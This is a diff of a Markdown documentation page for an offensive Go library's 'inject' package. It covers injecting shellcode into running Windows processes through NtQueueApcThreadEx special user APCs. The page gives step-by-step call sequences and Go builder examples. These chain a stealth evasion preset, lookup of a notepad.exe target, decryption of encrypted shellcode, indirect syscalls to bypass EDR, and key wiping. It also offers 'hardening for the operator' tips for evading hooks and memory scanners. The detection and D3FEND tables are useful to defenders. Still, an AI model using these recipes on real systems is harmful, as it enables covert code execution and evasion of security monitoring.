@@ -1,179 +1,249 @@
-# NtQueueApcThreadEx (Special User APC)
+---
+package: github.com/oioio-space/maldev/inject
+last_reviewed: 2026-04-27
+reflects_commit: 4798780
+---
 
-> **MITRE ATT&CK:** T1055.004 -- Process Injection: Asynchronous Procedure Call | **Detection:** Medium -- uses undocumented APC flag, but targets remote processes
+# NtQueueApcThreadEx — special user APC
+
+[← injection index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Cross-process APC injection that fires **immediately** at the next
+kernel-to-user transition, without the target needing to enter an
+alertable wait. Win10 1903+ only. Allocate / write / protect in the
+target as usual, then queue the APC with the
+`QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC` flag — the kernel delivers it
+on any thread the next time control returns to user mode.
 
 ## Primer
 
-Standard APC injection (Early Bird, QueueUserAPC) has a fundamental limitation: the target thread must enter an "alertable wait" state before the APC fires. This means you either need to create a new suspended process (Early Bird) or hope an existing thread calls `SleepEx`, `WaitForSingleObjectEx`, or similar. If no thread ever enters an alertable wait, your shellcode never runs.
+Standard `QueueUserAPC` only fires when the target thread enters an
+alertable wait (`SleepEx`, `WaitForSingleObjectEx`, …). Many real
+processes never enter alertable waits, so the classic APC technique
+either silently fails or relies on Early Bird's spawned-suspended
+trick. Special User APCs, introduced in Windows 10 build 18362
+(version 1903), fire on the next kernel-to-user mode transition,
+regardless of wait state — the kernel forces the APC dispatch.
 
-Windows 10 version 1903 introduced a game-changer: **Special User APCs**. These are APCs that fire immediately at the next kernel-to-user transition, without requiring an alertable wait. The undocumented `NtQueueApcThreadEx` function accepts a flag (`QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC = 1`) that enables this behavior.
+The flag (`1` / `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC`) is exposed
+via the undocumented `NtQueueApcThreadEx`. Pass it on a thread handle
+opened with `THREAD_SET_CONTEXT`, and the kernel inserts a special-APC
+record that fires on the very next `KiUserApcDispatcher` return — which
+happens within microseconds for any actively-running thread.
 
-This means you can inject shellcode into any running process -- no need to create a new suspended process, and no need to wait for an alertable state. Pick any thread, queue the APC, and it fires.
+The package enumerates threads of the target, tries each in turn, and
+stops at the first successful queue. Falls back to standard
+`QueueUserAPC` and then `CreateRemoteThread` when `WithFallback()` is
+set.
 
-## How It Works
+## How it works
 
 ```mermaid
 sequenceDiagram
-    participant Attacker as Attacker Process
-    participant Kernel as Windows Kernel
-    participant Target as Target Process
+    participant Impl as Implant
+    participant Kern as Kernel
+    participant Tgt as Target
 
-    Attacker->>Kernel: OpenProcess(VM_OPERATION | VM_WRITE | VM_READ)
-    Kernel-->>Attacker: hProcess
+    Impl->>Kern: OpenProcess(VM_OPERATION | VM_WRITE | VM_READ)
+    Kern-->>Impl: hProcess
+    Impl->>Kern: NtAllocateVirtualMemory(target, RW)
+    Impl->>Kern: NtWriteVirtualMemory(shellcode)
+    Impl->>Kern: NtProtectVirtualMemory(target, RX)
 
-    Attacker->>Kernel: NtAllocateVirtualMemory(hProcess, RW)
-    Kernel->>Target: Allocate memory page
-    Kernel-->>Attacker: remoteAddr
+    Impl->>Kern: enumerate threads of target
+    loop until first success
+        Impl->>Kern: NtOpenThread(tid, THREAD_SET_CONTEXT)
+        Impl->>Kern: NtQueueApcThreadEx(hThread, FLAG=1, remoteAddr)
+    end
 
-    Attacker->>Kernel: NtWriteVirtualMemory(shellcode)
-    Kernel->>Target: Copy shellcode to remote memory
-
-    Attacker->>Kernel: NtProtectVirtualMemory(RX)
-    Kernel->>Target: Make page executable
-
-    Attacker->>Kernel: OpenThread(THREAD_SET_CONTEXT)
-    Kernel-->>Attacker: hThread
-
-    Attacker->>Kernel: NtQueueApcThreadEx(hThread, FLAG=1, remoteAddr)
-    Kernel->>Target: Queue special user APC
-    Target->>Target: APC fires at next kernel→user transition
-    Target->>Target: Shellcode executes
+    Note over Tgt: next KiUserApcDispatcher return<br/>fires the special APC
+    Tgt->>Tgt: shellcode runs
 ```
 
-**Step-by-step:**
+Steps:
 
-1. **OpenProcess** -- Open the target process with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`.
-2. **NtAllocateVirtualMemory** -- Allocate `PAGE_READWRITE` memory in the target.
-3. **NtWriteVirtualMemory** -- Write shellcode into the allocated region.
-4. **NtProtectVirtualMemory** -- Flip permissions to `PAGE_EXECUTE_READ`.
-5. **Enumerate threads** -- Find all threads of the target process via `CreateToolhelp32Snapshot`.
-6. **OpenThread(THREAD_SET_CONTEXT)** -- Open a thread handle.
-7. **NtQueueApcThreadEx(hThread, 1, addr, 0, 0, 0)** -- Queue a special user APC. Flag `1` = `QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC`.
-8. The APC fires automatically at the next kernel-to-user mode transition -- no alertable wait needed.
+1. Open the target with `PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`.
+2. Allocate / write / protect in the target.
+3. Enumerate threads via `CreateToolhelp32Snapshot` (or
+   `NtQuerySystemInformation` if the caller demands it).
+4. For each thread: open with `THREAD_SET_CONTEXT`, call
+   `NtQueueApcThreadEx(hThread, 1, addr, 0, 0, 0)`.
+5. First success terminates the loop. The APC fires on the next
+   kernel→user transition.
 
-The implementation tries all threads in sequence and stops at the first successful queue.
+## Standard APC vs special APC
 
-## Special User APC vs Standard APC
+| Aspect | `QueueUserAPC` (standard) | `NtQueueApcThreadEx` (special) |
+|---|---|---|
+| Alertable wait required | yes | **no** |
+| Minimum Windows version | XP+ | 10 1903 (build 18362) |
+| API documentation | documented (`kernel32`) | undocumented (`ntdll`) |
+| Suspended process required | typically (Early Bird) | no |
+| Delivery timing | when thread enters alertable wait | next kernel→user transition |
+| EDR monitoring | well-known | less observed but ETW-Ti emits |
 
-| Aspect | QueueUserAPC (Standard) | NtQueueApcThreadEx (Special) |
-|--------|------------------------|------------------------------|
-| Alertable wait required | Yes | No |
-| Minimum Windows version | XP+ | 10 1903+ (build 18362) |
-| API documentation | Documented (kernel32) | Undocumented (ntdll) |
-| Needs suspended process | Typically (Early Bird) | No |
-| Delivery timing | When thread enters alertable wait | Next kernel→user transition |
-| EDR monitoring | Well-known pattern | Less monitored |
+## API Reference
 
-## Usage
+### `Method = MethodNtQueueApcThreadEx`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#MethodNtQueueApcThreadEx)
+
+The constant `"apcex"`. Pass to `Config.Method` or
+`InjectorBuilder.Method`.
+
+### `Builder` pattern
 
 ```go
-package main
+inj, err := inject.Build().
+    Method(inject.MethodNtQueueApcThreadEx).
+    TargetPID(pid).
+    IndirectSyscalls().
+    WithFallback().
+    Create()
+```
 
-import (
-    "log"
+### `inject.NewWindowsInjector(cfg *WindowsConfig) (Injector, error)`
 
-    "github.com/oioio-space/maldev/inject"
-)
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/inject#NewWindowsInjector)
 
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
-
-    // Inject into a target process by PID.
-    injector, err := inject.Build().
-        Method(inject.MethodNtQueueApcThreadEx).
-        TargetPID(1234).
-        Create()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
+```go
+cfg := &inject.WindowsConfig{
+    Config:        inject.Config{Method: inject.MethodNtQueueApcThreadEx, PID: pid},
+    SyscallMethod: wsyscall.MethodIndirect,
 }
+inj, err := inject.NewWindowsInjector(cfg)
 ```
 
-## Combined Example
+## Examples
+
+### Simple
 
 ```go
-package main
+inj, err := inject.Build().
+    Method(inject.MethodNtQueueApcThreadEx).
+    TargetPID(targetPID).
+    Create()
+if err != nil { return err }
+return inj.Inject(shellcode)
+```
 
+### Composed (indirect syscalls + fallback)
+
+```go
+inj, err := inject.Build().
+    Method(inject.MethodNtQueueApcThreadEx).
+    TargetPID(targetPID).
+    IndirectSyscalls().
+    WithFallback().
+    Create()
+if err != nil { return err }
+return inj.Inject(shellcode)
+```
+
+### Advanced (evade + locate target + special APC)
+
+```go
 import (
-    "log"
-
     "github.com/oioio-space/maldev/evasion"
     "github.com/oioio-space/maldev/evasion/preset"
     "github.com/oioio-space/maldev/inject"
     "github.com/oioio-space/maldev/process/enum"
 )
 
-func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC}
+_ = evasion.ApplyAll(preset.Stealth(), nil)
 
-    // 1. Apply evasion.
-    if errs := evasion.ApplyAll(preset.Stealth(), nil); errs != nil {
-        log.Printf("evasion errors: %v", errs)
-    }
-
-    // 2. Find target process.
-    procs, err := enum.FindByName("notepad.exe")
-    if err != nil || len(procs) == 0 {
-        log.Fatal("target not found")
-    }
-
-    // 3. Inject via NtQueueApcThreadEx with indirect syscalls.
-    injector, err := inject.Build().
-        Method(inject.MethodNtQueueApcThreadEx).
-        TargetPID(int(procs[0].PID)).
-        IndirectSyscalls().
-        WithFallback().
-        Create()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal(err)
-    }
+procs, err := enum.FindByName("notepad.exe")
+if err != nil || len(procs) == 0 {
+    return errors.New("target not found")
 }
+
+inj, err := inject.Build().
+    Method(inject.MethodNtQueueApcThreadEx).
+    TargetPID(int(procs[0].PID)).
+    IndirectSyscalls().
+    Create()
+if err != nil { return err }
+return inj.Inject(shellcode)
 ```
 
-## Advantages & Limitations
-
-| Aspect | Detail |
-|--------|--------|
-| Stealth | Medium -- avoids thread creation APIs, but still writes to remote process memory. |
-| Scope | Remote injection (requires target PID). |
-| Compatibility | Windows 10 1903+ only (build 18362). Fails on older versions. |
-| No alertable wait | The key advantage: APCs fire immediately without the target cooperating. |
-| Thread enumeration | Tries all threads; first successful queue wins. Some threads may refuse `THREAD_SET_CONTEXT`. |
-| Caller routing | Full -- `OpenProcess`, memory operations, and `NtQueueApcThreadEx` all route through Caller for EDR bypass. |
-| Fallback | Falls back to QueueUserAPC (standard), then CreateRemoteThread. |
-
-## API Reference
+### Complex (decrypt + special APC + wipe)
 
 ```go
-// Method constant
-const MethodNtQueueApcThreadEx Method = "apcex"
+import (
+    "github.com/oioio-space/maldev/cleanup/memory"
+    "github.com/oioio-space/maldev/crypto"
+    "github.com/oioio-space/maldev/evasion"
+    "github.com/oioio-space/maldev/evasion/preset"
+    "github.com/oioio-space/maldev/inject"
+)
 
-// Builder pattern
-injector, err := inject.Build().
-    Method(inject.MethodNtQueueApcThreadEx).
-    TargetPID(targetPID).
-    Create()
+_ = evasion.ApplyAll(preset.Stealth(), nil)
 
-// With indirect syscalls
-injector, err := inject.Build().
+shellcode, err := crypto.DecryptAESGCM(aesKey, encrypted)
+if err != nil { return err }
+memory.SecureZero(aesKey)
+
+inj, err := inject.Build().
     Method(inject.MethodNtQueueApcThreadEx).
     TargetPID(targetPID).
     IndirectSyscalls().
+    WithFallback().
     Create()
-
-// Config pattern
-cfg := &inject.WindowsConfig{
-    Config: inject.Config{
-        Method: inject.MethodNtQueueApcThreadEx,
-        PID:    targetPID,
-    },
-    SyscallMethod: wsyscall.MethodIndirect,
-}
-injector, err := inject.NewWindowsInjector(cfg)
+if err != nil { return err }
+if err := inj.Inject(shellcode); err != nil { return err }
+memory.SecureZero(shellcode)
 ```
+
+## OPSEC & Detection
+
+| Artefact | Where defenders look |
+|---|---|
+| Cross-process `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` | EDR userland hooks + ETW-Ti |
+| `NtQueueApcThreadEx` with the special-APC flag | ETW-Ti (`Microsoft-Windows-Threat-Intelligence`) emits an `ApcQueue` event with the flag — newer EDR rules key on it specifically |
+| Multiple consecutive `NtOpenThread(THREAD_SET_CONTEXT)` | Behavioural EDR rule — opening every thread until one succeeds is unusual |
+| APC start address outside any image | EDR memory scanners flag the orphan APC target |
+
+**D3FEND counters:**
+
+- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
+  — APC chain plus orphan start address is a strong signal.
+- [D3-PCSV](https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/)
+  — APC start should match an image.
+
+**Hardening for the operator:** combine with [`SectionMapInject`](section-mapping.md)
+or [`PhantomDLLInject`](phantom-dll.md) to make the APC start address
+image-backed; pair with [`evasion/unhook`](../evasion/ntdll-unhooking.md)
+so the cross-process Nt calls dodge userland hooks.
+
+## MITRE ATT&CK
+
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | Process Injection: Asynchronous Procedure Call | special-APC variant — no alertable wait | D3-PSA |
+
+## Limitations
+
+- **Win10 1903+ only.** Older Windows builds lack the special-APC
+  flag. The `WithFallback()` chain falls through to standard
+  `QueueUserAPC` then `CreateRemoteThread`.
+- **`THREAD_SET_CONTEXT` may be denied.** Some hardened threads
+  (services with restricted ACLs, PPL processes) refuse the open. The
+  loop keeps trying; if every thread refuses, the inject fails.
+- **Cross-process write still happens.** The technique avoids the
+  thread-creation event, not the VM-write event.
+- **Undocumented flag.** Microsoft has not promised stability for the
+  special-APC flag. Verify after major build upgrades.
+- **No PPL targets.** Cross-process VM operations on PPL are denied.
+
+## See also
+
+- [Early Bird APC](early-bird-apc.md) — child-process variant of the
+  same APC trick.
+- [CreateRemoteThread](create-remote-thread.md) — louder cousin used
+  as fallback.
+- [Section Mapping](section-mapping.md) / [Phantom DLL](phantom-dll.md)
+  — pair to make the APC start address image-backed.
+- [Repnz, *Special User APCs in Windows 10*](https://repnz.github.io/posts/apc/user-apc/)
+  — primer on the special-APC primitive.
